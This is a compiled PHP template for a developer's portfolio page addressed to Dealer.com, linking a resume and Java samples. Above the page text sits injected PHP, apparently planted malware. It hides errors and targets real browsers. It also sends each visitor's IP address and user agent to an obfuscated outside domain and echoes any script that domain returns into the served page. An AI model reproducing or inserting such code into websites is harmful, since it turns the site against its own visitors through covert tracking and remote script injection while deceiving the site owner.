<?php /* Smarty version 2.6.22, created on 2012-10-27 13:10:20
         compiled from /home/content/71/7128071/html//templates/dealer.html */ ?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/19f955#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<p>Hello interested people at Dealer.com!  Welcome to my portfolio.  To use an old internet term, this is very much "under construction".  I'll save you the pain of GIFs from 1999.</p>
<p>Please bear with me while I get all the relevant materials together.  For now, I please feel free to look around my site, it's a custom web store I programmed using PHP.  I will soon be providing this website's source code.</p>
<p style=”text-align:center”><a href='http://www.alanmarcero.com/resume.pdf'>Feel free to read through my resume and cover letter</a></p>
<p>First what I'd like to show you is that while my background is primarily in PHP, I do also have experience programming in Java.  <a href='http://www.alanmarcero.com/java.zip'>Here</a> is a pair of simple multi-threaded Java applications.  They have no GUI, but showcase a basic multi-threaded implementation using object oriented design patterns.</p>